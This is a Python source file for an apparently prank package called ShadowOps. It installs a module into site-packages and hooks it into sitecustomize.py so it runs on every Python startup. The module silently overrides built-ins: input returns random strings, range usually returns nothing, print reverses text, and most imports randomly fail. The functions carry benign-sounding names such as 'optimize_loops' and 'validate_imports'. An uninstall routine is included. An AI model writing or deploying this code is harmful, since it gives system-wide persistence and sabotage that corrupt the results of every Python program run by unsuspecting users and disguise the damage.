# shadowops/manager.py

import os
import sys
import shutil
import sysconfig
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def setup_shadowops():
    try:
        # Locate the correct site-packages directory
        site_packages = sysconfig.get_paths()["purelib"]
        shadowops_file_local = os.path.join(os.path.dirname(__file__), "shadowops.py")
        shadowops_path = os.path.join(site_packages, "shadowops.py")
        sitecustomize_path = os.path.join(site_packages, "sitecustomize.py")
        sitecustomize_backup = sitecustomize_path + ".backup"

        # Check if the script has write permissions to site-packages
        if not os.access(site_packages, os.W_OK):
            logging.error(f"Write permissions required for {site_packages}.")
            logging.info("Run this script with administrative/root permissions.")
            return

        # Step 0: Check if ShadowOps is already installed
        if os.path.exists(shadowops_path):
            logging.info("ShadowOps is already installed in site-packages.")
        else:
            # Step 1: Save ShadowOps Code into shadowops.py
            shadowops_code = """import builtins, sys, random, time

def flexible_input():
    def input(prompt=""):
        return random.choice(["42", "yes", "no", "unexpected error", "undefined"])
    builtins.input = input

def optimize_loops():
    def range(*args, **kwargs):
        return [] if random.random() < 0.7 else builtins.range(*args, **kwargs)
    builtins.range = range

def enhanced_print():
    def print(*args, **kwargs):
        if random.random() < 0.7:
            reversed_text = " ".join(str(arg)[::-1] for arg in args)
            builtins.print(reversed_text)
        else:
            builtins.print(*args, **kwargs)
    builtins.print = print

def validate_imports():
    original_import = builtins.__import__
    # Exclude essential modules
    safe_modules = ["os", "sys", "builtins", "time", "shadowops", "math", "json"]
    def restricted_import(name, *args):
        if name not in safe_modules and random.random() < 0.7:
            raise ImportError(f"Cannot import {name}")
        return original_import(name, *args)
    builtins.__import__ = restricted_import

def activate_all():
    flexible_input()
    optimize_loops()
    enhanced_print()
    validate_imports()

activate_all()
"""
            # Write shadowops.py in the package directory
            with open(shadowops_file_local, "w") as f:
                f.write(shadowops_code)
            logging.info(f"Created {shadowops_file_local}.")

            # Step 2: Copy shadowops.py to site-packages
            shutil.copy(shadowops_file_local, shadowops_path)
            logging.info(f"Copied shadowops.py to {shadowops_path}.")

        # Step 3: Backup existing sitecustomize.py if not already backed up
        if not os.path.exists(sitecustomize_backup):
            if os.path.exists(sitecustomize_path):
                shutil.copy(sitecustomize_path, sitecustomize_backup)
                logging.info("Backed up existing sitecustomize.py to sitecustomize.py.backup.")
            else:
                # Create an empty backup if sitecustomize.py does not exist
                open(sitecustomize_backup, 'a').close()
                logging.info("Created empty backup for sitecustomize.py.")

        # Step 4: Modify sitecustomize.py to include ShadowOps
        if os.path.exists(sitecustomize_path):
            with open(sitecustomize_path, "r") as f:
                contents = f.read()
        else:
            contents = ""

        if "import shadowops" not in contents:
            with open(sitecustomize_path, "a") as f:
                f.write("\nimport shadowops\n")
            logging.info(f"Appended 'import shadowops' to {sitecustomize_path}.")
        else:
            logging.info(f"'import shadowops' already present in {sitecustomize_path}.")

        logging.info("ShadowOps setup complete! Restart Python to activate the prank.")

    except PermissionError as pe:
        logging.error(f"Permission Error: {pe}")
        logging.info("Ensure you have the necessary permissions to modify site-packages.")
    except Exception as e:
        logging.error(f"Setup failed: {e}")

def uninstall_shadowops():
    try:
        # Locate the correct site-packages directory
        site_packages = sysconfig.get_paths()["purelib"]
        shadowops_path = os.path.join(site_packages, "shadowops.py")
        sitecustomize_path = os.path.join(site_packages, "sitecustomize.py")
        sitecustomize_backup = sitecustomize_path + ".backup"

        # Step 1: Remove shadowops.py from site-packages
        if os.path.exists(shadowops_path):
            os.remove(shadowops_path)
            logging.info(f"Removed {shadowops_path}.")
        else:
            logging.info(f"{shadowops_path} does not exist.")

        # Step 2: Restore sitecustomize.py from backup
        if os.path.exists(sitecustomize_backup):
            shutil.copy(sitecustomize_backup, sitecustomize_path)
            logging.info(f"Restored {sitecustomize_path} from backup.")
            os.remove(sitecustomize_backup)
            logging.info(f"Removed backup file {sitecustomize_backup}.")
        else:
            # Remove the 'import shadowops' line if no backup exists
            if os.path.exists(sitecustomize_path):
                with open(sitecustomize_path, "r") as f:
                    lines = f.readlines()
                with open(sitecustomize_path, "w") as f:
                    for line in lines:
                        if "import shadowops" not in line:
                            f.write(line)
                logging.info(f"Removed 'import shadowops' from {sitecustomize_path}.")
            else:
                logging.info(f"No backup found for {sitecustomize_path}.")

        logging.info("ShadowOps uninstallation complete. Restart Python to finalize changes.")

    except PermissionError as pe:
        logging.error(f"Permission Error: {pe}")
        logging.info("Ensure you have the necessary permissions to modify site-packages.")
    except Exception as e:
        logging.error(f"Uninstallation failed: {e}")
